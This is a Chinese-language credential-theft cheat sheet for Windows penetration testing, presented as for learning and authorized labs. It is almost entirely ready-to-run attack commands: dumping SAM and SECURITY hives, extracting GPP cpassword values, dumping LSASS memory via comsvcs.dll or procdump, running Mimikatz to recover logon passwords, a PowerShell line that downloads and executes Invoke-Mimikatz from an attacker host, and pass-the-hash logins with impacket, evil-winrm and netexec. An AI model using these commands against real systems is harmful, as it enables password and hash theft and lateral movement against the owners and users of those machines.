# 凭据

::: warning 仅供学习 / 授权实验
PPL / Credential Guard 开着就不要在 LSASS 上耗时间。Mimikatz 从作者仓库自行获取。
:::

## 先判型

```cmd
whoami /priv
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags
tasklist /FI "IMAGENAME eq lsass.exe"
```

`RunAsPPL=2` 或 `LsaCfgFlags!=0` → 放弃直读，走替代来源。

## 替代来源

```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SECURITY C:\Windows\Temp\sec.save
reg save HKLM\SYSTEM C:\Windows\Temp\sys.save
```

```bash
impacket-secretsdump -sam sam.save -security sec.save -system sys.save LOCAL
```

其它：计划任务 XML、`web.config`、服务 `binpath` 里的密码、SYSVOL GPP `cpassword`（老环境）。

```bash
# GPP（若还在）
findstr /S /I cpassword \\DOMAIN\sysvol\*.xml
```

## 无 PPL 时的 LSASS

```cmd
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump PID C:\Windows\Temp\ls.dmp full
```

拷回攻击机离线：

```
mimikatz
sekurlsa::minidump ls.dmp
sekurlsa::logonpasswords
```

Procdump（微软签名）：

```
procdump.exe -accepteula -ma lsass.exe ls.dmp
```

内存加载 Mimikatz（自己准备 `Invoke-Mimikatz.ps1`，本站不托管该文件）：

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords" "exit"'
```

## 哈希利用

```bash
impacket-psexec DOMAIN/USER@TARGET -hashes :NTHASH
impacket-wmiexec DOMAIN/USER@TARGET -hashes :NTHASH
evil-winrm -i TARGET -u USER -H NTHASH
netexec smb TARGET -u USER -H NTHASH
```
